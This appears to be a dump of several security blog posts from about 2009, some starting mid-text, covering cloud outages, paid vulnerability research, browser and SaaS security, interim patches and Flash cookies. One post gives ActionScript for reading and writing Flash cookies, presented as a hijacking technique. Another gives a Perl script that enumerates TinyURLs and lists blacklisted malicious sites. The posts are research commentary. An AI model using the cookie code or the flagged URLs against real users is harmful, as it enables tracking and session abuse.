Rich Miller over at DataCenterKnowledge.com just posted an interview with Urs Holzle from Google entitled \"How Google Routes Around Outages.\" The title of this post is a quote from the referenced article, and it seems rather fitting.On the one hand, I was a bit surprised to read Holzle admit the preference to have human involvement in remediating certain types of outages. It seems Google has automated technological controls to handle single system and small-scale failures (a whole equipment rack, etc.) within a single data center; but larger scale outages (such as a whole data center) are mitigated manually. On the other hand, I can understand the desire to have explicit human oversight; large-scale failures tend to have unpredictable cascading effects that are hard to account for with automated systems. In fact, Holzle mentions that the very systems designed to handle larger-scale outages tend to be the same systems responsible for the outages; the February GMail outage is an explicit example.Having said that, I still believe clouds need to be as self-sustaining as possible (preferably in automated fashion) despite the current limits of technology and engineering. That implied resiliency and redundancy is one of the core value propositions of clouds. Without it, clouds get devalued into not much more than a traditional managed hosting platform/service.My suggestion to organizations considering a purchase from a cloud-based vendor is to have a due-diligence discovery session regarding the cloud architecture that vendor has engineered. You want to see something akin to a fairly detailed Visio diagram depicting multiple datacenter/regional locations, with appropriate systems in each location and the roles they provide to the overall cloud platform and offered services. You want to see redundancy in systems and roles, with distribution and backups across disparate regions. Look for points of failure, and ask them how the entire cloud handles an outage and thwarts a service interruption during the failure for any given node you happen to point to. Especially point to an entire datacenter/region and ask what happens if that entire area of the cloud system goes down due large-scale power outage, natural disaster, etc. Also be wary of how cloud entrance points could become affected during an outage; it is great if the overall service will naturally shift processing to a secondary region if the entire first region experiences an outage, but it is also not so great if you have to explicitly go back and reconfigure your organization to point to the secondary region. Even though the processing survived, your point of entrance changed and thus you still had an outage. You definitely want to ensure all points of presence/entrance are fault tolerant.Overall, going with a cloud vendor still requires you to think about redundancy, fault tolerance, business continuity, etc. And it might require a little extra effort up front in order to ferret out the appropriate details from your cloud vendor during the initial evaluation. Fortunately, once you are satisfied with the resiliency offered by the vendor\'s cloud architecture, you can then focus your attention elsewhere--the vendor is the one that has to deal with the implementation and ongoing maintenance of the necessary architecture redundancy. And that is one headache that is definitely nice to outsource.Until next time,- Jeff', 'Cloud', 'https://www.zscaler.com/blogs/research/changing-tire-while-going-60mph');

The premise of which was that they are unwilling to put in the time and effort to research software vulnerabilities and then simply hand them over to software vendors free of charge. This concerned those in the \'Hugs Not Bugs\' camp who feel that researchers have a moral obligation to turn over vulnerability details to software vendors free of charge, as such an approach is in the best interest of all involved.         Full Disclosure         Before diving into my personal views on the subject of paid vulnerability research let me first provide full disclosure (blogger style). I know and respect the researchers that stood up an CanSecWest. Charlie Miller in particular served as a technical reviewer for the Fuzzing book that I co-wrote along with Pedram Amini and Adam Greene. Charlie is a great researcher and a stand-up guy.         My stance on paying for vulnerability research certainly isn\'t much of a secret. I ran the iDefense/Versign Vulnerability Contributor Program (VCP) for several years. We secured the intellectual property rights to hundreds of vulnerabilities during my tenure and worked with affected vendors to ensure that patches were ultimately produced for all issues. Our motivation was certainly financial and was driven by acquiring early access to vulnerability information and providing workarounds to clients until official patches became available. TippingPoint/3com went on to launch a similar program with their Zero Day Initiative (ZDI), which was actually launched by former iDefense employee, David Endler who was instrumental in launching the VCP program as well.         During my time at iDefense I came to realize the value of vulnerabilities. I also came to understand just how much software vendors benefited from such information. Bugs are not good for vendors as they result in negative publicity and reduce consumer confidence in a given product or vendor. Therefore, vendors have a very real incentive to ensure that they receive vulnerability information as quickly as possible and that such information does not become public knowledge. For a long time, vendors have promoted the hugs not bugs philosophy. Why wouldn\'t they? When researchers freely hand over vulnerability details, vendors receive monetary value at no cost and therein lies the failure. In a free market economy, value is not given away for very long before a market evolves. This led to the creation of programs such as the VCP and ZDI. Vendors have also heavily benefited from these programs as they still receive vulnerability details free of charge. The fee to the researcher is paid by a middle man.         Current State         It still amazes me that the VCP and ZDI remain the only open, main stream programs paying for vulnerabilities. Believe me, there is plenty of room at the party for others. Bugs are not going away. That does not however mean that there aren\'t other entities willing to pay for vulnerabilities. Unfortunately, other entities have no interest in sharing vulnerability information with software vendors. Government entities and criminal organizations are very willing to pay for vulnerabilities. However, they have very different motivations and seek to use the information for offensive purposes meaning that they have little interest in seeing patches emerge.         Despite understanding the value of vulnerabilities, vendors have been unwilling (at least openly) to pay for such information. The argument given is typically that they fear they will be held hostage by researchers demanding increasingly outrageous sums of money and threatening to publicly disclose the bug if they aren\'t paid. This argument just doesn\'t fly. Bug hunters already have numerous avenues to profit form their research should they choose to. If they seek the highest bidder they will find one and vendors will never be in the bidding process to begin with.         My Solution         My stance is simple. It\'s time for vendors to start paying for the value that they receive. Mozilla has for years had a program known as the Mozilla Security Bug Bounty Program. The program is quite basic - contributors receive $500 (and a t-shirt!) for critical security bugs which meet specific criteria. Now $500 pales in comparison to the $50K+ that may be available for the juiciest bugs but in my opinion the total value isn\'t the point. Those motivated solely by cash will go elsewhere, but I believe that the majority of researchers have little interest in negotiating back room deals to get full value. Rather, they are motivated by doing good, but want to be compensated to at least some degree for their hard work.         What\'s the appropriate price point for vendors? I\'ll leave that to the free market to decide. After all, that\'s what the invisible hand is for. Let\'s however consider the $5K value that was used by the Pwn2Own contest. By my count, during 2008, Microsoft issued 46 critical advisories. That amounts to $230K in payouts for such information. Now let\'s double that number to convert from advisories to actual vulnerabilities. We\'re still at less than $500K, which amounts to less than the salary of a three to four experienced bug hunters on staff and even if Microsoft hired a hundred bug hunters they\'d fail to identify all of the bugs found by outside researchers. It\'s also 2x the value that Microsoft is willing to pay as a bounty to catch those behind the Conficker worm. A worm that wouldn\'t have seen the light of day if critical Microsoft vulnerabilities had not existed in the first place.         Let\'s be honest, vendors have been paying for vulnerability knowledge for some time through employee salaries, lavish parties, recruiting efforts, etc., so why has it always been considered taboo to pay for the information directly? It time for a leading vendor (I\'m talking to you Microsoft) to step up and establish a program to pay third party researchers for the work that they do. Establish fixed prices (non-negotiable) for vulnerabilities that fit into your already well established severity rating system. Don\'t worry about paying more than everyone else but pay enough to compensate researchers for their time. I suspect that you\'ll be pleasantly surprised by the results.         Hugs Not Bugs was dead a long time ago...Charlie, Dino and Alex just made it official.         - michael', 'Analysis', 'https://www.zscaler.com/blogs/research/hugs-not-bugs');

Note that this is not particularly insightful as stated since it is derivative of the fundamental definition of disruptive innovation. But the trick with SaaS is that, on the surface, we have the notion of enacting the same standard processes we enact on any other given day (i.e. running software); the only perceived difference is that the software is running external to the enterprise instead of internal to it. Most people do not see that as a significantly different context—running software is running software, whether inside or outside the organizational boundaries.What people often fail to immediately see is that there is more at play here. Namely, history has given us operational models that are sensitive to the location of where the software is running. The web browser, exemplified by Internet Explorer, is a great example. IE\'s security model segregates different destinations into appropriate security zones. Each security zone is configured to a different risk profile. The traditional zones include explicitly trusted destinations, intranet destinations, and the rest of the Internet. Under this model, the Internet security zone is risk-averse while the intranet and trusted security zones are more lax.SaaS challenges this established model of security zones since it involves taking software functionality typically operating internal to the organization (in the intranet security zone) and moving it external to the organization (in the Internet security zone). The same software functionality is now acting under an entirely different risk profile since it is located in a different zone, and that can impact the functionality and/or the user experience.Let us look at a particular situation applicable to the Zscaler offering. Organizations traditionally host their HTTP proxies within their organizational boundaries. Those proxies operate in the intranet security zone; within this zone, the browser (IE) is willing to automatically authenticate to the proxies using native Windows authentication. The result is that the authentication process is transparent to the user, and everything just works. Now consider what happens when those proxies are moved outside the organization as part of a SaaS: the proxies fall into the Internet zone—and the browser does not natively perform transparent authentication in that zone. In fact, it requires significant browser re-configuration (and arguably some non-ideal loosening of security restrictions) before the browser will once again exhibit this behavior outside the intranet zone. Administrators have grown complacent with automatic HTTP proxy authentication within the organization; we would even venture to call the feature ubiquitous. So imagine the administrators\' surprise when this seemingly fundamental HTTP proxy behavior is upset when shifting to a SaaS-provided HTTP proxy. Absolutely nothing about the technology has changed—the only difference is the browser-enforced security model relating to where the resource is located.So what needs to happen? Vendors need to review and refresh their security models to ensure they are compatible with the SaaS paradigm of transferring once-internal resources out onto the Internet and into the cloud. Fortunately most SaaS services acting as a normal HTTP web site destination can be accommodated by explicit inclusion on the trusted destinations list; SaaS-provided HTTP proxy services are at a much larger loss because that mechanism does not directly apply to proxies. In fact, the proxy configurability and support offered by most web browsers often suffers from legacy networking assumptions and feature atrophy. Internet Explorer in particular introduced the (now) standard crop of proxy capabilities in IE 5 (WPAD and PAC support, circa 1999); we are now one decade later and there have been no additions to IE\'s proxy configurability or feature support since then. Other browsers have normalized to the same feature set as well, offering no new innovation in that area. I believe that the last ten years have brought about many process changes that warrant revisiting the role that HTTP proxies play in the enterprise, how the web browser should relate to those roles, and how SaaS can affect legacy assumptions of those roles.So web browser vendors, please hear my plea: after ten years, it is time to blow the dust off of your security models and proxy configurability to ensure they are in-line with the latest SaaS and technology offerings and expectations.Until next time,- Jeff', 'Uncategorised', 'https://www.zscaler.com/blogs/research/new-browser-security-model-needed-saas');

Let\'s compare the security features in major desktop/mobile web browsers:    Phishing    As mentioned, FireFox and Mozilla first added support for phishing blacklists over two years ago and since then it has become standard functionality in desktop web browsers. FireFox and Safari leverage the Google SafeBrowsing initiative, while Microsoft follows a proprietary path. Regardless, phishing protection, despite being standard issue on the desktop, is a no-go on mobile browsers...at least until iPhone OS3.0 is released this summer.    Malicious URLs    Like phishing, malicious URL protection takes advantage of blacklists to prevent users from visiting a site, which is known to host malicious content. Malicious URL protection was added after phishing but has now also become a standard feature. Once again, FireFox and Safari leverage the Google SafeBrowsing, while other vendors go it on their own, or through partnerships.    Extended Validation SSL Certificates    I question the true value of EV SSL Certificates and their adoption has been slow at best. Regardless, if they have any hope at better protecting end users, they must be supported by web browsers. It is therefore encouraging to see that they are supported by all major desktop browsers (but no mobile browsers).    Cross-Site Scripting (XSS)    With the release of IE 8, Microsoft will become the first major browser vendor to provide built-in support for XSS attacks. Early reviews of the XSS inspection engine included in IE 8 look promising. This, in my opinion is the single most important step in finally reducing the risk posed but what has long been the single most prevalent web application vulnerability.    Clickjacking    Microsoft went for the full sweep by also being the first vendor to introduce protections against clickjacking. However, their proposed protections also require special server side code. While they should be commended for their efforts, this is one control that is destined for failure.    Mobile Browsers    So why have have mobile browsers not yet included security features. Let\'s look at the possibilities.    1.) Mobile browsers do not have the storage capacity or processing power to accomodate security functionality.    Comment: My iPhone has 16GB of storage and better graphics than last-gen gaming consoles.    Verdict: Busted!    2.) Mobile browsers are not commonly subjected to attacks due to limited capabilities/use and security controls are not therefore necessary.    Comment: Mobile browsers have nearly equivalent functionality to thier desktop counterparts. They are fully capable of handling JavaScript, AJAX and if you\'re not an Apple fanboy...even Flash. Mobile browsers are also starting to constitute a meaningful percentage of overall web traffic. I personally actually prefer using my mobile browser for certain tasks, such as reviewing blog headlines, checking sports scores and scanning tweets. I prefer the simplicity of a mobile browser for simple tasks as it allows me to quickly review contents.    Verdict: Busted!    3.) We will never learn from our mistakes.    Comment: We have said for years (decades) that security must be baked in, as opposed to being brushed on. Yet, when it comes to quickly getting a product to market in order to win market share, security is consistently thrown out the window.    Verdict: Confirmed!    - michael', 'Mobile', 'https://www.zscaler.com/blogs/research/mobile-bowser-insecurity');

Answers, Orkut and Wikipedia itself due to concerns that it is a favored tool of spammers. It\'s not entirely surprising given that there are no shortage of stories relating to spammer\'s use of the URL shortening service. TinyURL is clearly concerned by this bad rap. They have added a preview feature, allowing users to get a sneak peek at the site before being redirected and they specifically call out spammers in their terms of service:\r\n \r\n\r\nUsing [TinyURL] for spamming or illegal purposes is forbidden and any such use will result in the TinyURL being disabled and you may be reported to all ISPs involved and to the proper governmental agencies.\r\n\r\n \r\n\r\nFor those not familiar with TinyURL, it\'s a simple and popular service which allows a user to submit any lengthy URL and in return receive a URL of the format - http://tinuurl.com/xxxxxx (e.g. http://tinyurl.com/bwcdzs) , where \'x\' represents a base 36 (a-z + 0-9) character. While it may at first glance appear that they\'d quickly run out of addresses, such an approach actually renders 2+ billion unique URLs. When a user browses to a TinyURL, the service returns a 301 \'Moved Permanently\' status code along with a Location header of the true URL that the browser then requests. When TinyURL was first launched in 2002, the primary motivation was to enable linking to newsgroup postings which tend to have lengthy, ugly URLs. Today however, it\'s more popular than ever given the increasing use of mobile applications and Twitter, which limits posts to 140 characters.\r\n\r\n \r\n\r\n \r\n\r\nI personally have always wondered if TinyURL was getting a bad rap. While I agree that it provides a basic form of URL obfuscation by hiding the true destination from an end user, there are certainly no shortage of such techniques, especially when dealing with naive victims that are fooled by a TinyURL. Moreover, the browser is simply redirected - it does ultimately make a separate request for the true destination URL. As a result, browser controls such as blacklists are still effective as they would catch the \'evil\' site on the second request, following the redirection. I\'ve also heard rumor that TinyURL now actively filters for bad content - if they aren\'t they certainly should be.\r\n \r\n\r\nIn an effort to satisfy my curiosity, I set out to see the world according to TinyURL. Fortunately, it\'s not hard at all to determine which pages TinyURL is redirecting users to. TinyURL by design is open, so authentication is not required to use the service. I could therefore automate the process of looping through a subset of TinyURLs, request the URL and record the Location header returned in the 301 response. I came up with the following Perl code:\r\n\r\n#!/usr/bin/perl\r\n\r\nuse LWP 5.64;\r\nuse Math::Base36 \':all\';\r\n\r\nuse LWP::UserAgent;\r\n\r\nmy $browser = LWP::UserAgent->new;\r\n\r\nfor ($count = 1; $count <= 100000; $count++) { my $tiny = encode_base36($count); my $url = \"http://www.tinyurl.com/$tiny\"; my $response = $browser->get($url);\r\n\r\nprint $url, \" --> \";\r\nprint $response->header(\"Location\"), \"\\n\";\r\n\r\n}\r\n\r\n\r\nThe code is pretty basic, it simply loops 100K times, converts the count to a base36 number, requests the associated TinyURL and then records the Location header in the response. TinyURL does not for some reason implement any verification to ensure that the submitted URL adheres to standards or even exists. Therefore, the resulting list of URLs, not surprisingly included close to 10K entries that did not represent legitimate URLs. Of the legitimatly formed URLs that were found, they could be divided into the following protocols:\r\n\r\n\r\n	HTTP - 90,541\r\n	HTTPS - 1,036\r\n	FTP - 339\r\n\r\nNow it wasn\'t hard to spot URLs that suggested a malicious purpose, such as those which attempted to further obfuscate the true domain, redirect to LAN based resources or even resources on a local machine. While such TinyURLs may have been registered for use in a planned attack, they also suggest a lack of understanding as to how browsers and the web itself actually functions. Most posed no threat whatsoever.\r\n\r\nGeography\r\n\r\nI leveraged the IP::Country::Fast Perl module and ran through the cleaned up URLs to determine where the destination pages were hosted. The United States was by far the most common location for servers to be hosted at, with 98.93% of the TinyURLs investigated. After the US, the following countries made up the top 20:\r\n\r\n\r\nWhat does this tell us? Very little...but it is a pretty graph.\r\n\r\nURL Categories\r\n\r\nURL categories are a little more interesting. I ran the clean TinyURLs collected through our classification engine to determine the overall \'type\' of content that was showing up. If the service was being abused, I would expect to see \'malicious\' categories dominating the list.\r\n\r\n \r\n \r\n\r\nDefinitely nothing too scandalous here. While there was some volume for \'questionable\' categories such as Nudity (1,047), Pornography (964) and Anonymizers (151)...clearly malicious categories - Malware (126) and Phishing (14) had minimal volume given the overall population.\r\n\r\nExecutables\r\n\r\nI would assume that if TinyURL were heavily leveraged in attacks, that a sizable portion of content would point to executable files, which attackers are trying to social engineer victims into downloading. 465 TinyURLs did directly reference *.exe files. However, understandably, not all URLs were available for download at the time of the test. Of the 197 executables that I was able to retrieve, all were run through AV and a grand total of zero were reported to be infected.\r\n\r\nPhishing\r\n\r\nThis is an area where I fully expected to get some solid results. To identify potential phishing URLs, I leveraged PhishTank, a great open collection of human verified phishing data. Specifically, I took advantage of their check URL functionality which permits you to submit an individual URL and receive XML data detailing whether or not the page represents a verified phishing site. All of the cleaned up TinyURL data was submitted (~90K URLs) and none represented confirmed phishing URLs.\r\n\r\nMalicious URLs\r\n\r\nThis time around I took advantage of the Google SafeBrowsing Diagnostic page and once again automated the process. I was only able to get through about half of the full list of URLs as my script needed to incorporate a delay to ensure that it didn\'t get blocked, however, the results seem fairly conclusive. While malicious URLs were identified, of ~50K URLs only the following five were found to be black listed:\r\n\r\n\r\n	http://www.extremeplusmarketing.net/webmaster\r\n	http://dongjian.chinanusa.com/sites/DO/Dongjian/image/bb005.jpg\r\n	http://www.iranmania.com/news/ArticleView/Default.asp?NewsCode=10927&NewsKind=CurrentAffairs&ArchiveNews=Yes\r\n	http://www.fortunecity.com/marina/cyprus/125/cyberbraai/cybera.htm\r\n	http://www.firewallreporting.com/clearice/usingclearice.htm\r\n\r\nConclusion\r\n\r\nPoor TinyURL...it would appear that you\'re getting a bum rap after all. Yes, we did identify some malicious content but certainly not enough to justify your lifetime ban from some of the cool web 2.0 parties.\r\n\r\n- michael', 'Analysis', 'https://www.zscaler.com/blogs/research/world-according-tinyurl');

This complaint may or may not be the same as the one from nCircle, in which the patch installs differently and does not provide future protection if the vulnerability has already been exploited (calling this behavior an incomplete fix seems pretty reasonable to me). There\'s a whoops or two in here somewhere, be it an unsuccessful fix from Microsoft, Panda publicly disclosing a vulnerability without giving the vendor time to provide a patch, news outlets propagating a bogus story, Panda not posting anything to back up their claim, or my inability to find the actual data Panda posted. Conveniently, I don\'t need the details to ramble on about patches & security in general: whether this patch in particular had problems or not, security patches have holes, too.\r\n\r\nWhy is that?\r\n\r\nTo start with, many security issues are correctness issues. What applies to software in general also applies to security patches: writing bug-free code is hard to the point of impossible (depending on whether you\'re talking to a formal methods geek). To approximate it, one typically needs extreme attention to detail; very good knowledge of the surrounding code, intended architecture, and behavior of surrounding systems; a full coverage test suite; a good development process; and enough time to carefully design, code and test the software in question. As you can see from this simplified view, there will be quite a lot of work involved. There will be correctness issues in software, including security patches, and some of these correctness issues will cause security problems.\r\n\r\nFor security issues that go beyond correctness issues, you can take the above list of stuff you need to write high-quality code and increase the existing knowledge, test & time requirements substantially, and add knowledge about the specific security issues; security issues that go beyond correctness are usually more complicated to understand and reproduce than \"simple\" correctness issues. Complicated tends to mean more bugs, and some of the bugs will be security issues.\r\n\r\nNow let\'s add in the fact that it\'s a patch.\r\n\r\nEven if you only maintain one supported version (i.e. you work for a SaaS ;) ), you\'re not going to work on that supported version every day. You\'re mostly going to work on some future release. Chances are good that you have unconscious expectations about what features are available to you, and how the surrounding code acts, based on the code you work with regularly. Quite a lot of this may be new since the supported release, but since your assumptions about its presence are unconscious, you probably don\'t have a complete list of new features in mind and you may not think to ask yourself whether what you are doing will always work safely given that X is not present. The wider the gap between the supported version & what you\'re working on now, the more likely you are to slip up in this way.\r\n\r\nIf you have multiple supported versions, you get to repeat the above for every supported version. And it gets worse: again, unless you work for a SaaS, you have to cover the possibility that not all your previously published patches (security or not) have been installed. Your fix needs to work whatever the patch state, for all your supported versions, which means you have to think it through and test for each supported version & possible patch state.\r\n\r\nFor most developers, adding new features is way more fun than writing patches. You probably can\'t wait to get back to whatever you were working on when somebody reported this bug.\r\n\r\nAnd for a security patch?\r\n\r\nSecurity is a specialty & mindset of its own, and it can be hard for non-security developers to understand the issue they\'re fixing as deeply as they would understand a correctness issue.\r\n\r\nThere is extra pressure to get a security patch out fast. Distracted people in a hurry make more mistakes.\r\n\r\nTypically, a security patch will reduce functionality. Backwards compatibility is a big issue: customers hardly ever want you to take something away. Ideally, you would remove the functionality the attacker can use without affecting the functionality legitimate users use, but this isn\'t always possible, and then you have some really tricky decisions to make.\r\n\r\nBecause of all these factors, you can expect security patches to have holes now & then. Sometimes they\'ll be the same holes, not yet fixed, and sometimes they\'ll be shiny and different. Personally, I feel the same way as most of the security administrators I know: I\'ll take the new hole over the old hole every time, and keep on patching as quick as I can.\r\n\r\n--Brenda\r\n\r\n(Yes, this counts as more fuel for the give-me-an-interim-patch-while-you-do-all-that-work fire.)', 'Vulnerability', 'https://www.zscaler.com/blogs/research/patch-get-some-new-holes');

Sure, a lot of people are questioning the legality of this stunt, but that\'s not what really caught my attention. Most live hacking demonstrations involving real targets are legally questionable anyways, and despite the laws many people feel entitled (and sometimes even obligated) to do XSS and SQLi testing against arbitrary web applications on the Internet.What caught my eye was a few interesting choice remarks made in the article. First, they called their 22,000 node botnet \"low-value.\" What, pray tell, makes this botnet particularly low value? Is it what hackers would charge to rent/sell it? Is it the number of nodes (a mere 22,000)? I think this is a great illustration of the inflated grandness that media has really driven to botnet stories...apparently botnets under a quarter-million nodes are worth less consideration. Yet by the article\'s own admission, it only took a scant 60 nodes to DDoS their target website off the Internet. Make no mistake, 22,000 nodes at an attacker\'s command can do a considerable amount of damage to just about any target. There are even supercomputers listed on the world\'s top 500 supercomputers list that leverage far fewer than 22,000 nodes. I would hardly trivialize a 22k node botnet with the label \"low-value,\" as it desensitizes everyone to the overall threat that any sized botnet can represent.Second, the article mentions they \"acquired\" their own botnet \"after visiting some chatrooms\" on the Internet. I wish they had provided a bit more details here...did they troll chat rooms until they found a botnet for sale, and purchase it? Or did they intercept an IRC-based command and control channel of the bots, thus hijacking the botnet to do their bidding? Either way, their candor regarding the ease of acquiring a botnet seems strange. I would think the story of how anyone can \"visit some chatrooms\" and walk away with a botnet would be more sensational than filling some demo inboxes with spam.As an aside, the \"how a botnet works\" graphic they include in the article was a bit weird as well; the truncated version you see in the article leaves a lot to be desired (\"Hacker -> virus\"?).

Now, perhaps these sites have absolutely perfect database security, the web scripts use a read-only account DB account, and SQL access is restricted to a limited view of the table...meaning the web script isn\'t exploitable to do much beyond just read the already-public read-only data from a single table.

Bud Selig served as interim commissioner for six years before Major League Baseball officially handed over the reins in 1998. When businesses face big challenges and a perfect solution isn\'t imminent, they implement an interim solution. It may be temporary, it may be imperfect, but something is better than nothing. Why then is the software industry so opposed to interim patches?    Two weeks ago, Adobe acknowledged a vulnerability in most versions of Adobe Reader that could lead to remote code execution. In that same advisory, they announced that a patch would be issued by March 11, leaving arguably the majority of computers exposed to attack worldwide. To make matters worse, security firms have suggested seeing attacks as early as the beginning of 2009 leveraging this attack vector. One would therefore presume that Adobe has had knowledge of this issue for some time.    Adobe went on to suggest that users disable JavaScript in order to protect themselves. That advice was short lived as on March 3rd, Dave Aitel announced that Immunity had released a working exploit which did not require the use of JavaScript. Not to worry though, as Adobe also assured customers that it was working with anti-virus vendors to ensure that signature based detection would be available to protect against potential attacks. How\'s that working out? A quick check with VirusTotal shows that as of this evening, only 5 of 39 AV vendors have protection in place for the proof of concept exploit released on February 22nd. That\'s less than 13% of vendors for an exploit for which source code has been available for nearly two weeks! It\'s tough to argue with Damballa\'s recent bashing of the AV industry.    The security industry on the other hand had a very different reaction. Lurene Grenier of SourceFire, released a homebrew patch just three days after the Adobe Advisory. Now I find it hard to believe that if a sole researcher, with no access to source code or exclusive knowledge of a given product can implement basic protection within days, that Adobe cannot do the same, with better quality, in a short time frame. I\'m not asking for a perfect solution - I can wait until March 11 for that. I\'m asking for an interim patch - a quick fix to a big problem. Yes, I\'m willing to accept the risk that it will break something and hinder my ability to view PDF documents. Heck, I\'m even willing to accept that it will erase a few. I\'m willing to accept that risk, because it is far less damaging than the prospect of unwittingly joining the next botnet army. Sadly, while the recent Adobe debacle has become a poster child for the availability of interim patches it\'s only the latest high profile vulnerability representing a problem that won\'t go away on it\'s own.    Our industry loves to fuss and debate over formulas and approaches to determine risk. Rather than kick off a study group to study the work of another group, let me cut to the chase and propose a simple questionnaire for the entire software industry. The next time an evil-doer exposes a vulnerability in one of your software products, ask yourself three simple questions:    - Are more than 10% of Internet users affected?  - Is an exploit in the wild?  - Will it take more than 7 days to release a permanent fix?    If you answered yes to all of the above questions - stop reading and start writing - a quick and dirty patch that we can all use to protect ourselves.    - michael', 'Analysis', 'https://www.zscaler.com/blogs/research/interim-patches');

I feel that most users are at least familiar with cookies in general, and to some extent this technology has taken a bad rap as a privacy concern. While cookies certainly can lead to privacy concerns, we should keep in mind that they have become a key component in today\'s rich web applications, enabling persistence which is leveraged for authentication, user preferences, etc. As end users have become increasingly uncomfortable of the existence of data which permits sites to track their web clicks, they have begun disabling cookies within their browsers or adopting applications which permit the blocking of cookies. Yet, what many don\'t realize, is that the same tracking features they are trying to avoid are not only alive and well, but exist in a much more powerful form, thanks to Flash cookies.    Local SharedObjects were first introduced in Flash Player 6.0 in March 2002, so they\'ve been around for a while. Combine this with the fact that (thanks largely to YouTube) Adobe is able to claim being present on 99% of Internet enabled desktops and Flash becomes a de-facto standard client side platform. Flash Cookies offer developers more flexibility than their HTTP based counterparts in virtually every category:      	Storage Capacity - By default, sites can store up to 100K of data on a local file system and no explicit consent is required form the end user. HTTP cookies can likewise store data without asking permission but are limited to 4K in most browser implementations.  	Expiry - HTTP cookies are either session based, meaning that they are wiped upon exiting the application/browser or have an explicit expiration date. Flash cookies on the other hand, by default have no expiration.  	File Format - Flash cookies are stored in a binary format, but contain text based data, so they\'re easy to read directly from the file system, so long as you know where they\'re stored (see below). There are also a variety of LSO readers that can be used.      LSO Storage Locations           	Windows XP  	  		$user\\Application Data\\Macromedia\\Flash Player\\#SharedObjects  	  	  	Windows Vista  	  		$user\\AppData\\Roaming\\Macromedia\\Flash Player\\#SharedObjects  	  	  	Mac OS X  	  		~/Library/Preferences/Macromedia/Flash Player/#SharedObjects  	  	  	Linux  	  		/home/$user/.macromedia/Flash_Player/#SharedObjects  	  	      From a developers perspective, the greatest advantage of Flash cookies appears to be the fact that users aren\'t overly familiar with them an wouldn\'t know how to delete them even if they were. In fact it wasn\'t until Flash Player 8.0 was released that Adobe actually added a Settings Manager to permit users to see and manage the Flash cookies on their system. This is the same control panel which was previously vulnerable to clickjacking. Browser privacy features which permit users to wipe local content including HTTP cookies do not presently touch Flash cookies, although I wouldn\'t be surprised to see this change over time.    Common security concerns for HTTP cookies outside of privacy involve cookie hijacking or injection or more generically, the ability to read from or write to a user\'s cookies. This is a significant threat given that cookies maintain persistence for authentication purposes and it is especially concerning given the prevalence of cross-site scripting vulnerabilities which facilitate such attacks.    Is cookie hijacking/injection possible with Flash cookies as can be done with HTTP cookies? The answer is yes, so long as the attacker has an ability to upload Flash content to the target domain. While this is a significant hurdle, the prevalence of Flash on the web and the acceptance of user supplied content on web sites, means that this isn\'t as difficult a challenge as you might think. As with HTTP cookies, Flash cookies enforce a same origin policy. Flash cookies can also restrict access based on the path where the Flash cookies are deployed. For example, a site where users have personal content (e.g. domain.com/user_page/), which stored all file uploads in one place (e.g. domain.com/all_files/) instead or user specific locations (e.g. domain.com/user_page/all_files/) could expose itself to attack. If Flash content can be uploaded, an attacker simply needs to build a Flash file which can read from/write to an existing LSO. While the name of the LSO is required, this is a trivial challenge as such data is already stored on the client side. The following ActionScript code sample permits writing to a Flash cookie:    package {    import flash.net.SharedObject;  import flash.display.Sprite;    public class zscaler extends Sprite {  private var user:SharedObject;  private var firstname :String;  private var lastname:String;  public function zscaler() {    user = SharedObject.getLocal(\"zscaler\");  firstname = \"Michael”;  lastname = \"Sutton\";    user.data.firstname = firstname;  user.data.lastname = lastname;    user.flush();  }  }  }    Once the code is written, it must be compiled into a *.swf file, which can be done using freely available tools such as the Adobe Flex 3 SDK, which includes a Flash compiler. In the above example, an LSO named zscaler is created which has two variables (firstname and lastname). Reading from an existing Flash cookie is equally as easy:    …  public function zscaler() {  var label:TextField;    user = SharedObject.getLocal(\"zscaler\");    firstname = user.data.firstname;  lastname = user.data.lastname;    label = new TextField();  label.autoSize = TextFieldAutoSize.LEFT;  label.background = true;  label.border = true;  label.text = \"Firstname: \" + firstname + \"\\nLastname: \" + lastname;    addChild(label);    user.flush();  }  …    The code has been abbreviated as it\'s largely identical to the previous sample. In this case, we once again call getLocal() using the name of an existing LSO and then simply read existing data (e.g. user.data.firstname). The example will display the contents of these variables in a text box.    If you\'re curious to know how many sites are leveraging Flash cookies, simply check the Website Storage Settings panel in your Adobe Flash Player Settings Manager. I suspect you\'ll be surprised to see how many sites are leveraging this technology. Also take time to browse through the content of these LSOs. Given the larger storage capacities available, you may find some interesting and perhaps insecure content.    Take care.    - michael', 'Abuse', 'https://www.zscaler.com/blogs/research/demystifyingabusing-flash-cookies');

Acacio Cruz, Gmail’s Site Reliability Manager, explained in a little more detail regarding the outage. My interpretation of his explanation is that they had a bug in how data is shifted around in the cloud, and during a shift one of data centers couldn\'t handle the new burden, failed, and eventually the effect cascaded.I have a few comments on this. First, GMail still carries the \'beta\' moniker...and aren\'t service disruptions like this kind of expected/tolerated with beta software? But beta or not, real people use the service--including Google themselves (according to Acacio Cruz\'s post). So maybe it\'s time to promote GMail out of beta and designate it as production, since that\'s what it is to most people anyways. Second, running a resilient cloud is hard, particularly when it comes to outages and the resulting automatic rebalancing to cover the gap and maintain availability. It\'s like a tire on a car: everything rotates routinely and drives smoothly when the tire is balanced. But if the center of balance of the tire shifts dramatically at a random moment, things quickly deteriorate and the high-speed rotation can cause significant instability and damage to the rest of the vehicle. Computing clouds are conceptually similar. What happens when an outage takes out a piece of the cloud and the finely orchestrated balance is randomly skewed...is the capacity of the rest of the cloud sufficient to absorb the load? Can the cloud rebalance itself gracefully? These are the same types of questions one will hear when investigating fault tolerance, failover, and redundancy capabilities of any normal technology component (servers, firewalls, WAN links, etc.). But the questions take on a whole new level of scale when you apply them to a cloud.Plus let\'s not overlook the fact that we have different fault tolerance expectations for services in the cloud. The typical perception of clouds seems to imply internal failover capabilities. After all, that\'s part of the appeal of clouds: all that fault tolerance, redundancy, etc. is magically taken care of within the cloud. The cloud is infallible. The cloud cannot fail. Those are the dominant marketing messages. No one talks about having a contingency plan for when the cloud is unavailable (what would that be exactly? A second hot-spare cloud?).So when choosing a cloud-based vendor, you should try to investigate their cloud resiliency. Vendors who take non-cloud specific software, run copies of it in two or three datacenters, and call it a cloud service are likely not delivering the true expected experience to customers. Software needs to be purpose-built to run in a cloud, including multi-tenancy design and strong internal failover capability. That\'s because most people wind up putting all of their eggs into the cloud basket. If you are going to be one of those people, you should try to make sure the basket offers the implied safety that you expect.Until next time,- Jeff', 'Cloud', 'https://www.zscaler.com/blogs/research/big-white-puffy-clouds-can-still-evaporate');

